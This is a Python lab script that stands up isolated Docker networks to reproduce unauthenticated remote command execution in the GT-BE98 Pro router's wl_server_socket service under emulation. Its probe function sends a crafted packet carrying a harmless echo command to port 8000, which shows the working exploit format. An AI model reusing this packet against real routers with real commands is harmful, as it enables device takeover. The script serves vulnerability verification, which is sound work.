#!/usr/bin/env python3
"""Isolated two-segment GT-BE98 Pro wl_server_socket exposure lab."""

from __future__ import annotations

import json
import subprocess
import sys
import time
from pathlib import Path


ROOT = Path(__file__).resolve().parents[1]
EXTRACTED = next(
    (ROOT / "known_firmware/extracted/e9c3bdc196cdc005").glob(
        "**/squashfs-root/usr/sbin/wl_server_socket"
    )
).parents[2]
IMAGE = "friday-hacker-agent:latest"
ROUTER = "gtbe98-wl-router-lab"
LAN_CLIENT = "gtbe98-wl-lan-client"
WAN_CLIENT = "gtbe98-wl-wan-client"
LAN_NET = "gtbe98-wl-lan"
WAN_NET = "gtbe98-wl-wan"
LAN_IP = "172.30.98.2"
WAN_IP = "172.30.99.2"


def run(*args: str, check: bool = True) -> subprocess.CompletedProcess[str]:
    result = subprocess.run(args, text=True, capture_output=True)
    if check and result.returncode:
        raise RuntimeError(
            f"command failed ({result.returncode}): {' '.join(args)}\n"
            f"stdout: {result.stdout}\nstderr: {result.stderr}"
        )
    return result


def docker(*args: str, check: bool = True) -> subprocess.CompletedProcess[str]:
    return run("docker", *args, check=check)


def cleanup() -> None:
    for container in (LAN_CLIENT, WAN_CLIENT, ROUTER):
        docker("rm", "-f", container, check=False)
    for network in (LAN_NET, WAN_NET):
        docker("network", "rm", network, check=False)


def reachable(container: str, address: str, expected: bool) -> dict[str, object]:
    result = docker(
        "exec", container, "nc", "-z", "-w", "2", address, "8000", check=False
    )
    actual = result.returncode == 0
    return {"source": container, "destination": address, "reachable": actual,
            "expected": expected, "pass": actual == expected}


def fixed_marker_probe(container: str, address: str, marker: str) -> bool:
    code = (
        "import socket,struct;"
        f"c=b'echo {marker} > /tmp/{marker}\\0';"
        f"s=socket.create_connection(('{address}',8000),3);"
        "s.sendall(struct.pack('<9I',0,len(c),8,0,len(c),0,0,0,0)+c);"
        "s.close()"
    )
    result = docker("exec", container, "python3", "-c", code, check=False)
    if result.returncode != 0:
        return False
    time.sleep(0.5)
    check = docker(
        "exec", ROUTER, "sh", "-c",
        f"test \"$(cat /tmp/{marker} 2>/dev/null)\" = {marker}",
        check=False,
    )
    return check.returncode == 0


def start_server(interface: str | None) -> None:
    docker("exec", ROUTER, "pkill", "-f", "wl_server_socket", check=False)
    docker("exec", ROUTER, "mkdir", "-p", "/tmp/RWL")
    command = [
        "exec", "-d", ROUTER, "/usr/bin/qemu-arm-static",
        "-L", "/firmware", "/firmware/usr/sbin/wl_server_socket", "-b",
    ]
    if interface:
        command.extend([interface, "8000"])
    docker(*command)
    time.sleep(1)


def main() -> int:
    cleanup()
    results: dict[str, object] = {
        "firmware_root": str(EXTRACTED),
        "topology": {
            "lan": f"{LAN_NET}: {LAN_IP}/24 via br0",
            "wan": f"{WAN_NET}: {WAN_IP}/24 via eth0",
            "published_host_ports": [],
        },
        "tests": [],
    }
    try:
        docker("network", "create", "--internal", "--subnet", "172.30.98.0/24", LAN_NET)
        docker("network", "create", "--internal", "--subnet", "172.30.99.0/24", WAN_NET)
        docker(
            "run", "-d", "--name", ROUTER, "--user", "root",
            "--cap-add", "NET_ADMIN",
            "--network", WAN_NET, "--ip", WAN_IP,
            "-v", f"{EXTRACTED}:/firmware:ro", IMAGE, "sleep", "infinity",
        )
        docker("network", "connect", "--ip", LAN_IP, LAN_NET, ROUTER)
        docker(
            "run", "-d", "--name", LAN_CLIENT, "--network", LAN_NET,
            "--ip", "172.30.98.10", IMAGE, "sleep", "infinity",
        )
        docker(
            "run", "-d", "--name", WAN_CLIENT, "--network", WAN_NET,
            "--ip", "172.30.99.10", IMAGE, "sleep", "infinity",
        )
        # Resolve Docker's opaque name for the attached LAN veth by address.
        addresses = docker(
            "exec", ROUTER, "ip", "-j", "-4", "addr", "show"
        ).stdout
        interfaces = json.loads(addresses)
        by_address = {
            info["local"]: interface["ifname"]
            for interface in interfaces
            for info in interface.get("addr_info", [])
        }
        wan_device = by_address[WAN_IP]
        lan_device = by_address[LAN_IP]
        if wan_device != "eth0":
            raise RuntimeError(
                f"default-bind model invalid: WAN interface is {wan_device}, not eth0"
            )
        # Rename the isolated LAN-side veth to br0 to model Asuswrt's L3 LAN
        # boundary without requiring a host bridge.
        docker("exec", ROUTER, "ip", "link", "set", lan_device, "down")
        docker("exec", ROUTER, "ip", "link", "set", lan_device, "name", "br0")
        docker("exec", ROUTER, "ip", "link", "set", "br0", "up")

        # Default launch: compiled eth0 bind. This models exposure before the
        # router's WAN INPUT policy is applied.
        start_server(None)
        results["tests"].append(reachable(WAN_CLIENT, WAN_IP, True))
        results["tests"].append({
            "name": "default_eth0_unauthenticated_command",
            "reproduced": fixed_marker_probe(
                WAN_CLIENT, WAN_IP, "FRIDAY_GTBE98_WAN_RCE"
            ),
        })

        # Representative Asuswrt boundary: unsolicited WAN TCP/8000 denied.
        docker(
            "exec", ROUTER, "iptables", "-I", "INPUT", "1", "-i", "eth0",
            "-p", "tcp", "--dport", "8000", "-j", "DROP",
        )
        results["tests"].append(reachable(WAN_CLIENT, WAN_IP, False))

        # Explicit LAN launch on br0. No WAN port or host port is published.
        start_server("br0")
        results["tests"].append(reachable(LAN_CLIENT, LAN_IP, True))
        results["tests"].append({
            "name": "explicit_br0_unauthenticated_command",
            "reproduced": fixed_marker_probe(
                LAN_CLIENT, LAN_IP, "FRIDAY_GTBE98_LAN_RCE"
            ),
        })
        results["tests"].append(reachable(WAN_CLIENT, LAN_IP, False))

        print(json.dumps(results, indent=2))
        failures = [
            test for test in results["tests"]
            if test.get("pass") is False or test.get("reproduced") is False
        ]
        return 1 if failures else 0
    finally:
        cleanup()


if __name__ == "__main__":
    raise SystemExit(main())
